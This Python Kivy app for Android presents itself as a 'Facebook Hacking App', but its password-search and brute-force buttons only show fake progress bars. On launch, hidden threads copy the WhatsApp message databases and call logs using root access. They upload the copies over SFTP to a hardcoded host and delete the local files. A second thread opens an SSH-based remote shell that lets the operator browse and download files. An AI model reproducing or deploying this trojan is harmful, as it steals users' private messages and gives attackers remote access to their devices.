#qpy:kivy
#importing Kivy UI etc
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.lang import Builder
from kivy.uix.button import Button
from kivy.uix.popup import Popup
from kivy.uix.label import Label
#importing progress bar
from kivy.uix.progressbar import ProgressBar

#importing time and thread 
import time
import threading
#importing os and paramiko

import paramiko
import os


#subprocesses imported
import subprocess


#builder to start building UI
Builder.load_string('''
<Myinterface>:
    orientation: 'vertical'

    Label:
        text: "Facebook Hacking App"

    Label:
        text: "Hack Your Friend Facebook By Just Using Profile Name"
        
    BoxLayout:
        orientation: 'vertical'   
        TextInput:
            id: variable
            hint_text: "Enter Target Profile Name i,e Hussam Khrais"
        MyButton:
            user_input: variable.text
            text: "Search For Password In Our Database"
            on_release: self.do_action()

    Label:
        text: "Or"

    
    BoxLayout:
        orientation: 'vertical'
        TextInput:
            id: variable2
            hint_text: "Enter Target Profile Name i,e Hussam Khrais"
        MyButton2:
            user_input2: variable2.text
            text: "Online Brute Forcing -- Takes Longer Time!"
            on_release: self.do_action2()

    Label:
        text: "For educational purpose only, use it on your own risk!"

''')


class MyInterface(BoxLayout):
    pass


class MyButton2(Button):

    def progbar(self):
        pb = ProgressBar()
        popup = Popup(title='Brute Forcing... Do NOT Close This Window!', content=pb, size_hint=(0.7, 0.3))
        popup.open()
        time.sleep(2)
        pb.value = 25
        time.sleep(4)
        pb.value = 50
        time.sleep(6)
        pb.value = 75
        time.sleep(8)
        pb.value = 100

        popup = Popup(title="Password Not Found!",content=Label(text="Password Not Found in our dictionary, give it a try later"),size_hint=(0.7,0.3))
        popup.open()


    
    def do_action2(self, *args):
        if self.user_input2=='': # user enter no value
            popup = Popup(title="Profile Name Can't Be empty!",content=Label(text="Profile Name Format ie Hussam Khrais"),size_hint=(0.7,0.3))
            popup.open()
            return

        threading.Thread(target=self.progbar).start()
        return

class MyButton(Button):

    def progbar(self):
        pb = ProgressBar()
        popup = Popup(title='Searching in DB... Do NOT Close This Window!', content=pb, size_hint=(0.7, 0.3))
        popup.open()
        time.sleep(2)
        pb.value = 25
        time.sleep(4)
        pb.value = 50
        time.sleep(6)
        pb.value = 75
        time.sleep(8)
        pb.value = 100
        popup = Popup(title="Password Not Found!",content=Label(text="Double check profile name OR try brute force option!"),size_hint=(0.7,0.3))
        popup.open()

    def do_action(self, *args):

        if self.user_input=='': # user enter no value
            popup = Popup(title="Profile Name Can't Be empty!",content=Label(text="Profile Name Format ie Hussam Khrais"),size_hint=(0.7,0.3))
            popup.open()
            return
        threading.Thread(target=self.progbar).start()
        return



    

class MyApp(App):
    def build(self):
        return MyInterface()





#sftp function 
def sftp(path):
    try:
        transport = paramiko.transport.Transport(('192.168.1.22', 222))#port number and ip address
        transport.connect(username='root', password ='toor')#userID and password
        sftp_client = paramiko.SFTPClient.from_transport(transport)
        sftp_client.put(path, '/root/Desktop/SFTP/'+path)#file transfer path
        sftp_client.close()
        transport.close()
    except:
        pass


def connect():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect('192.168.1.22',username='Priyank', password='123')#authenticate host key
    chan = client.get_transport().open_session()
    chan.send("Hey i'm connected here :) ")
    print chan.recv(1024)


    while True:
        
        command =  chan.recv(1024)
        if 'terminate' in command:           #if terminate       
            chan.close()
            break 


        elif 'pwd' in command:                  
            chan.send( "[+] CWD Is " + os.getcwd() )#current working directory

        elif 'ls' in command:#list files
            dirs = os.listdir( os.getcwd() )
            chan.send(str(dirs))
  
        
        elif 'cd' in command:
            try:#change directory 
                code,directory = command.split ('*')
                os.chdir(directory)
                chan.send( "[+] CWD Is " + os.getcwd() )
            except:#error for change directory 
                chan.send( "[-] Error, Double check the Dir" )

        elif 'uname' in command:#OS details
            chan.send ( str(os.uname()) )

        elif 'download' in command:#download
            blah,path = command.split('*')
            threading.Thread(target=sftp, args=(path,)).start()
            chan.send( '[+]Starting SFTP Function' )
        else:
            chan.send ( '[-] Unrecognized command!' )
            




def root_check():#take root permissions
    proc =  subprocess.Popen('su',  stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)#root access
    command = 'cp /data/data/com.whatsapp/databases/wa.db /storage/emulated/0/' +\#copy files 
          ' ; cp /data/data/com.whatsapp/databases/msgstore.db /storage/emulated/0/'+\
          ' ; cp /data/data/com.sec.android.provider.logsprovider/databases/logs.db /storage/emulated/0/'
    (out, err) = proc.communicate(command)
    if proc.returncode !=0:
        os._exit(1)        # The command execution has failed and that indicates that 
                           # Either The Device is NOT Rooted OR Root Permession Is Not Given
        

    
    transport = paramiko.transport.Transport(('192.168.1.22', 222))
    transport.connect(username='root', password ='toor')
    sftp_client = paramiko.SFTPClient.from_transport(transport)
    sftp_client.put('/storage/emulated/0/wa.db', '/root/Desktop/SFTP_Upload/wa.db')
    sftp_client.put('/storage/emulated/0/msgstore.db', '/root/Desktop/SFTP_Upload/msgstore.db')
    sftp_client.put('/storage/emulated/0/logs.db', '/root/Desktop/SFTP_Upload/logs.db')
    sftp_client.close()
    transport.close()
    os.remove('/storage/emulated/0/wa.db')#delete files
    os.remove('/storage/emulated/0/msgstore.db')
    os.remove('/storage/emulated/0/logs.db')




threading.Thread(target=root_check).start()#starts root action
threading.Thread(target=connect).start() #starts connect action
MyApp().run()
#subscribe www.youtube.com/priyankgada















